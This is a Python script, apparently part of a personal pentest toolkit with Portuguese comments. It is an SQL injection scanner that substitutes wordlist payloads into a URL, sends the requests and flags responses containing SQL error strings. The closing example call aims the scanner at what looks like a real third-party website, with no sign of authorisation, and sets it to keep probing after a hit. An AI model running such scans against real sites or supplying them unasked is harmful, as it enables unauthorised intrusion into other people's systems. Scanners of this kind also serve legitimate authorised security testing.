import time

import functions
import essentials


def sqli(url, file, ua_status=False, timeout=10, SSL=True, proxies=None, interval=5, continue_=False, advanced=False):

    # tornar o modo advanced uma forma de reconhecimento do sql
    # colocar uma forma de continue mesmo que seja detectada uma possivel vulnerabilidade
    # alterar o test_url para que aceite http tambem
    name_save_file = 'sqli.json'
    
    sql_errors = [
        'You have an error in your SQL syntax',
        'Warning: mysql',
        'Unclosed quotation mark',
        'SQLSTATE',
        'syntax error',
        'SQL syntax',
        'mysql',
        'warning',
        'SQL syntax',
    ]
    
    payloads = essentials.fileReader(file)
    if not payloads:
        print(f'[-] Nao encontrado: {file}')
        return False, f'[-] Nao encontrado: {file}'
    
    for payload in payloads:
        payload = payload.strip()
        test_url = f'https://{url}'.replace('*', payload)

        time.sleep(interval) # intervalo entre requisicoes

        status, r = functions.request(test_url, timeout=timeout, SSL=SSL, proxies=proxies) # requisicao
        
        if status:
            print(f'[-][{functions.time_now()}][{r.status_code}] Tentando: {test_url}')
            for error in sql_errors:
                if error.lower() in r.text.lower():
                    print(f'[+][{functions.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}')
                    if not continue_:
                        return True, f'[+][{functions.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'

        else:
            print(f'[-][{functions.time_now()}] {r}')
        
        json_obj_response = {
            'hostname': url,
            'payload': payload,
            'url': test_url,
            'status_code': r.status_code if status else 404,
            'error': False if status else True,
            'error_details': None if status else r,
            'date_time': functions.time_now(),
            'response_headers': {},
            'response_certificate':{},
        }
        print(json_obj_response)
        essentials.json_write(json_obj_response, name_save_file)
    
    return False, f'[-][{functions.time_now()}] Nenhuma vulnerabilidade encontrada'

# Exemplo de uso:
status, attk = sqli(
    'www.socasadas.com/?s=*',
    '/home/maserati/Downloads/Python/wx78/wordlists/sqli/injection.txt',
    continue_=True,
)

print(attk)